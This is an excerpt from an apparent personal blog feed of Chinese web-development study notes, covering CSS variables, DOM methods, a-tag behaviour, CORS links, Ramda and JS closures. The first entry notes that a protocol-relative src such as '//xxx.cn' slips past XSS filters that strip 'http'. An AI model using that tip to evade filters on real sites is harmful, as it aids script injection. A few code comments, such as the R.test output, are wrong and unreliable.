      <content type="html"><![CDATA[<p>额,这个标题起得不好</p>
<p>因为有的时候src标签会过滤掉<code>http</code>,就是xss里写<code>src=&#39;http://&#39;</code>会被咔嚓<br>然后就是发现其实只要写<code>src=//xxx.cn</code>这样子就可以了</p>
<blockquote>
<p>咦,我不记得直接写<code>src=xxx.cn</code>可以不</p>
</blockquote>
<p>所以今天随手在浏览器地址栏里多敲了<code>//</code><br>就是敲了个<code>//www.qq.com</code><br>然后发现并不是像前面跳到<code>http://www.qq.com</code><br>而是跳到了<code>file:////www.qq.com</code></p>
<p>同样的<code>/www.qq.com</code>会跳到<code>file:///www.qq.com</code><br>只有<code>www.qq.com</code>可以跳到<code>http://www.qq.com</code></p>
<blockquote>
<p>还有个问题就是如果是如果是https会怎样子的</p>
</blockquote>
<p>先把问题记下来<br>先看完手头这本书后换掉,日后再补</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Flask学习]]></title>
      <url>/2017/05/23/Flask%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>我一定要学会用Flask!</p>
<p>算了算了无法入门</p>
<p>只是学会了router,后面的不想学了</p>
<p>我还是用<code>node+express+handlebars</code>好了</p>
<p>只是想用FLask做一个api服务器,一端连app,一端连某个服务器,<br>然后从某服务器爬取数据处理一下,返回给APP<br>额,大概是<code>Flask+requests+beautifulSoup</code></p>
<p>不想渲染来渲染去,还不如用我熟悉的js</p>
<p>反正我咸鱼一条</p>
<p>所以我放弃了Flask的学习,哈哈哈哈,快乐咸鱼每一天</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[websocket]]></title>
      <url>/2017/05/23/websocket/</url>
      <content type="html"><![CDATA[<p>前几天做ctf的时候有一道题目叫弹幕<br>是一道socket的题目<br>想学一下socket</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/socketio/socket.io/" target="_blank" rel="external">https://github.com/socketio/socket.io/</a> (socket.io 2.0 都出来了…)<br><a href="https://github.com/joewalnes/websocketd" target="_blank" rel="external">https://github.com/joewalnes/websocketd</a> (Turn any program that uses STDIN/STDOUT into a WebSocket server)<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket</a> (MDN websocket)<br><a href="http://www.ruanyifeng.com/blog/2017/05/websocket.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/05/websocket.html</a> (ruanyifeng)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS变量]]></title>
      <url>/2017/05/23/CSS%E5%8F%98%E9%87%8F/</url>
      <content type="html"><![CDATA[<p>天啦噜</p>
<h2 id="CSS支持变量了"><a href="#CSS支持变量了" class="headerlink" title="CSS支持变量了"></a>CSS支持变量了</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.foo</span> &#123;</div><div class="line">  <span class="attribute">--foo</span>: <span class="number">20px</span>;</div><div class="line">  <span class="attribute">font-size</span>: <span class="built_in">var</span>(--foo);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>大概来说就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-- 用来定义变量</div><div class="line">var() 用来读变量值(只能作为属性值,不能作为属性名)</div><div class="line">calc() 用来计算</div></pre></td></tr></table></figure></p>
<p>具体参考MDN</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_variables" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_variables</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Javascript DOM编程艺术笔记]]></title>
      <url>/2017/05/23/Javascript-DOM%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="addLoadEvent-p83"><a href="#addLoadEvent-p83" class="headerlink" title="addLoadEvent [p83]"></a>addLoadEvent [p83]</h2><p>可以用于添加n个函数到onload后执行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addLoadEvent</span>(<span class="params">func</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> oldLoad = <span class="built_in">window</span>.onload;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line">        <span class="built_in">window</span>.onload = func;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            oldLoad();</div><div class="line">            func();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="p87"><a href="#p87" class="headerlink" title="[p87]"></a>[p87]</h2><p>几个知识点<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">showPic</span>(<span class="params">whichpic</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">document</span>.getElementById(<span class="string">'placeholder'</span>))</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">var</span> source = whichpic.getAttribute(<span class="string">'href'</span>);</div><div class="line">    <span class="keyword">var</span> placeholder = <span class="built_in">document</span>.getElementById(<span class="string">'placeholder'</span>);</div><div class="line">    <span class="keyword">if</span>(placeholder.nodeName != <span class="string">'IMG'</span>) <span class="comment">// point1</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    placeholder.setAttribute(<span class="string">'src'</span>, source);</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'description'</span>)) &#123;</div><div class="line">        <span class="keyword">var</span> text = whichpic.getAttribute(<span class="string">'title'</span>) ? whichpic.getAttribute(<span class="string">'title'</span>) : <span class="string">''</span>;</div><div class="line">        <span class="keyword">var</span> description = <span class="built_in">document</span>.getElementById(<span class="string">'description'</span>);</div><div class="line">        <span class="keyword">if</span>(description.firstChild.nodeType == <span class="number">3</span>) &#123; <span class="comment">//point</span></div><div class="line">            description.firstChild.nodeValue = text;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>point1: nodeName的返回结果总是大写形式,即使在HTML文档里是小写<br>point2: 文本节点的nodeType是3</p>
<h2 id="DOM-Core-amp-amp-HTML-DOM"><a href="#DOM-Core-amp-amp-HTML-DOM" class="headerlink" title="DOM Core &amp;&amp; HTML-DOM"></a>DOM Core &amp;&amp; HTML-DOM</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">getElementById</div><div class="line">getElementByTagName</div><div class="line">getAttribute</div><div class="line">setAttribute</div></pre></td></tr></table></figure>
<p>这些方法都是DOM Core的组成部分.并不专属于JavaScript,支持DOM的任何一种程序设计语言都可以使用它们<br>有好多属性属于HTML-DOM,在DOM Core出现之前很久就为人们所熟悉了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">'form'</span>)</div></pre></td></tr></table></figure></p>
<p>就等价于HTML-DOM里的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.forms</div></pre></td></tr></table></figure></p>
<p>HTML-DOM中还提供了很多描述HTML元素的属性比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">element.getAttribute(<span class="string">'src'</span>)</div></pre></td></tr></table></figure></p>
<p>等价于<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">element.src</div></pre></td></tr></table></figure></p>
<p>再比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">element.setAttribute(<span class="string">'href'</span>, src)</div></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">element.href = src</div></pre></td></tr></table></figure>
<blockquote>
<p>结构与行为分离越大越好</p>
</blockquote>
<h2 id="document-write-p98"><a href="#document-write-p98" class="headerlink" title="document.write [p98]"></a>document.write [p98]</h2><blockquote>
<p>从某种意义上讲, <code>document.write</code>方法有点像<code>&lt;font&gt;</code>标签里设定字体一样,不够优雅<br>好像说的有道理,但在某些题目中好像是可以绕过一些东西来着<br>这个时候想到了这个方法和文档流的一些问题,比如什么情况下,会发生清空body内容的情况</p>
</blockquote>
<p>另外书中提到</p>
<blockquote>
<p><code>document.write()</code>和<code>innerHTML</code>都是HTML的专有属性/方法,不能用于MIME类型为<code>application/xhtml+xml</code>的XHTML文档</p>
</blockquote>
<h2 id="DOM-方法"><a href="#DOM-方法" class="headerlink" title="DOM 方法"></a>DOM 方法</h2><h3 id="createElement"><a href="#createElement" class="headerlink" title="createElement"></a>createElement</h3><h3 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild"></a>appendChild</h3><h3 id="createTextNode"><a href="#createTextNode" class="headerlink" title="createTextNode"></a>createTextNode</h3><h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>感觉这本书不错<br>我好想再补一下鹅厂<code>javascript设计模式</code>那本书</p>
<p>## </p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[a标签]]></title>
      <url>/2017/05/23/a%E6%A0%87%E7%AD%BE/</url>
      <content type="html"><![CDATA[<p>今天遇到了问题,所以在网上找了些资料,关于<br>a标签的href和onclick</p>
<h2 id="大概"><a href="#大概" class="headerlink" title="大概"></a>大概</h2><ol>
<li>onclick里的事件先被执行,然后才是href中定义的页面跳转或者javascript伪协议</li>
<li><p>如果都定义了,想要阻止href的动作,就要使得onclick返回false,所以经常看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onclick=&quot;xxx();return false;&quot;&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>如果页面过长有滚动条，且希望通过链接的onclick事件执行操作。应将它的href 属性设为<code>javascript:void(0);</code>，而不要是<code>#</code>，这可以防止不必要的页面跳动(其实的话是不是<code>javascript:;</code>是一样的效果)</p>
<blockquote>
<p>因为实际上<code>#</code>会代表着<code>#top</code>,而<code>javascript:void(0);</code>什么都不代表</p>
</blockquote>
</li>
</ol>
<p>丢个完整的demo<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">utf-8</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"go.html"</span> <span class="attr">onclick</span> = <span class="string">"doSomething1()"</span>&gt;</span>link1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">onclick</span> = <span class="string">"doSomething2()"</span>&gt;</span>link2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">doSomething1</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">    <span class="keyword">return</span> confirm(<span class="string">"离开?"</span>);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">doSomething2</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> ret = confirm(<span class="string">"离开?"</span>);</span></div><div class="line"><span class="javascript">    <span class="keyword">if</span>(ret)&#123;</span></div><div class="line"><span class="javascript">        <span class="built_in">window</span>.location.href = <span class="string">"go.html"</span>;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这两个link都能实现离开前确认的效果,长见识了</p>
<h2 id="传说中的提交表单不跳转"><a href="#传说中的提交表单不跳转" class="headerlink" title="传说中的提交表单不跳转"></a>传说中的提交表单不跳转</h2><p>原来是说可以这样子</p>
<ol>
<li>使用<code>display:none</code>的iframe</li>
<li>使用AJAX<br>现在看到好像可以<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;javascript:void(document.form.submit())&quot;&gt;</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="可不可以不写href"><a href="#可不可以不写href" class="headerlink" title="可不可以不写href"></a>可不可以不写href</h2><blockquote>
<p>不写href就不会变蓝,,你的a看起来就是黑字<br>不过现在都不流行这样子的a了.都是css成按钮样式的了</p>
</blockquote>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="http://www.cnblogs.com/goldarch/archive/2010/06/16/1759031.html" target="_blank" rel="external">http://www.cnblogs.com/goldarch/archive/2010/06/16/1759031.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[跨域]]></title>
      <url>/2017/05/23/%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<p>跨域真是一件让人头疼的事情啊</p>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>为什么要跨域,因为有同源策略啊</p>
<h2 id="SO"><a href="#SO" class="headerlink" title="SO?"></a>SO?</h2><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000003642057" target="_blank" rel="external">https://segmentfault.com/a/1190000003642057</a><br><a href="http://www.cnblogs.com/vajoy/p/4295825.html" target="_blank" rel="external">http://www.cnblogs.com/vajoy/p/4295825.html</a> (这个大佬的blog不错)<br><a href="http://imweb.io/topic/56822fdb57d7a6c47914fbf3" target="_blank" rel="external">http://imweb.io/topic/56822fdb57d7a6c47914fbf3</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
<p><a href="http://www.freebuf.com/articles/web/65468.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/65468.html</a><br><a href="http://www.freebuf.com/news/65669.html" target="_blank" rel="external">http://www.freebuf.com/news/65669.html</a><br><a href="http://www.freebuf.com/news/65979.html" target="_blank" rel="external">http://www.freebuf.com/news/65979.html</a></p>
<p><a href="http://newhtml.net/using-cors/" target="_blank" rel="external">http://newhtml.net/using-cors/</a><br><a href="http://blog.csdn.net/mevicky/article/details/51404610" target="_blank" rel="external">http://blog.csdn.net/mevicky/article/details/51404610</a></p>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>在找资料的过程中get到这样子一个tool<br><a href="http://www.fefork.com/fetool/" target="_blank" rel="external">http://www.fefork.com/fetool/</a><br>和这样子一个ppt项目介绍<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/3930220.html#3545040" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/3930220.html#3545040</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ramda]]></title>
      <url>/2017/05/23/ramda/</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
<p>想有时间学一下,先mark一下</p>
<p>算了不过了,mark啥,现在就学学呗</p>
<p>等我先写完,,,那个a的href和onclick就学这个</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ramda]]></title>
      <url>/2017/05/23/Ramda/</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
<p>想有时间学一下,先mark一下</p>
<p>算了不过了,mark啥,现在就学学呗</p>
<p>等我先写完,,,那个a的href和onclick就学这个</p>
<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>柯里化(写法二)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> R = <span class="built_in">require</span>(<span class="string">'ramda'</span>);</div><div class="line"><span class="comment">// 写法一</span></div><div class="line">R.map(square, [<span class="number">4</span>, <span class="number">8</span>])</div><div class="line"></div><div class="line"><span class="comment">// 写法二</span></div><div class="line">R.map(square)([<span class="number">4</span>, <span class="number">8</span>])</div></pre></td></tr></table></figure></p>
<p>就是一种<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">R.func1(func2)(data)</div></pre></td></tr></table></figure></p>
<p>好吧我其实不能接受加减乘除写成这样<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">R.add(<span class="number">7</span>)(<span class="number">10</span>) <span class="comment">// 17</span></div><div class="line">R.subtract(<span class="number">10</span>)(<span class="number">8</span>) <span class="comment">// 2</span></div><div class="line">R.multiply(<span class="number">2</span>)(<span class="number">5</span>)  <span class="comment">// 10</span></div><div class="line">R.divide(<span class="number">71</span>)(<span class="number">100</span>) <span class="comment">// 0.71</span></div></pre></td></tr></table></figure></p>
<p>这些字符串操作还好<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">R.split(<span class="string">'.'</span>)(<span class="string">'a.b.c.xyz.d'</span>)</div><div class="line"><span class="comment">// ['a', 'b', 'c', 'xyz', 'd']</span></div><div class="line"></div><div class="line">R.match(<span class="regexp">/([a-z]a)/g</span>)(<span class="string">'bananas'</span>) </div><div class="line">R.match(<span class="regexp">/[a-z]a/g</span>)(<span class="string">'bananas'</span>) <span class="comment">//我有个问题,加不加这个括号有什么区别呢</span></div><div class="line"><span class="comment">// ['ba', 'na', 'na']</span></div><div class="line"></div><div class="line">R.test(<span class="regexp">/^x/</span>)(<span class="string">'xyz'</span>)</div><div class="line"><span class="comment">// ['a', 'b', 'c', 'xyz', 'd']</span></div></pre></td></tr></table></figure></p>
<p>函数合成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> negative = <span class="function"><span class="params">x</span> =&gt;</span> <span class="number">-1</span> * x;</div><div class="line"><span class="keyword">var</span> increaseOne = <span class="function"><span class="params">x</span> =&gt;</span> x + <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> f = R.pipe(<span class="built_in">Math</span>.pow, negative, increaseOne);</div><div class="line">f(<span class="number">3</span>, <span class="number">4</span>) <span class="comment">// -80 =&gt; -(3^4) + 1</span></div></pre></td></tr></table></figure></p>
<p>那么问题来了,我为什么要在这里拷贝拷贝呢,,,需要的时候查api不就行了</p>
<p>然后看到他的另一篇<br><a href="http://www.ruanyifeng.com/blog/2017/03/pointfree.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/pointfree.html</a><br>然后觉得有点意思</p>
<p>叫做<code>Pointfree</code></p>
<p>有一例子感觉挺好的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> str = <span class="string">'Lorem ipsum dolor sit amet consectetur adipiscing elit'</span>;</div><div class="line"><span class="keyword">var</span> getLongestWordLength = R.pipe(</div><div class="line">  R.split(<span class="string">' '</span>),</div><div class="line">  R.map(R.length),</div><div class="line">  R.reduce(R.max, <span class="number">0</span>)</div><div class="line">);</div><div class="line">getLongestWordLength(str);</div><div class="line"><span class="comment">// 11</span></div></pre></td></tr></table></figure></p>
<p>确实很语义化,很酷炫,,,</p>
<p>后面还有个很长的例子,,,很酷炫</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Javascript入门1.0]]></title>
      <url>/2017/05/23/Javascript%E5%85%A5%E9%97%A81-0/</url>
      <content type="html"><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>是一个熟悉的段子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>some test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:;</span>&gt;</span>11<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span>22<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:void(0);</span>&gt;</span>33<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</span></div><div class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span></div><div class="line"><span class="undefined">                a_list[i].innerHTML = i;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>自豪的写了三种不同的不跳转的a,其实大概就是花式false</p>
</blockquote>
<p>然后感觉..诶?我点让他点击弹出来点什么东西来,于是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</div><div class="line">    a_list[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        alert(i);</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>结果悲剧了,为什么都弹出3啊(哇,假装好奇的样子)</p>
<h2 id="开始回忆"><a href="#开始回忆" class="headerlink" title="开始回忆"></a>开始回忆</h2><p>这个问题的话,没有记错的话,是因为这里的i是一个全局变量,ES5没有块作用域,不过有个函数作用域<br>所以当每个人被点的时候,onclick被调用的时候,i=3, 所以都会alert(3);<br>开始好像有过疑问,为什么不是<code>a_list[0]</code>绑定onclick的时候就变成了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这样子的呢,hhhhhh~我也不知道</p>
<h2 id="找到解决办法"><a href="#找到解决办法" class="headerlink" title="找到解决办法"></a>找到解决办法</h2><h3 id="以前用过的"><a href="#以前用过的" class="headerlink" title="以前用过的"></a>以前用过的</h3><ol>
<li><p>使用ES6<br>这个办法我知道使用<code>let</code></p>
</li>
<li><p>使用一个闭包<br>一直以来我就是用的这个</p>
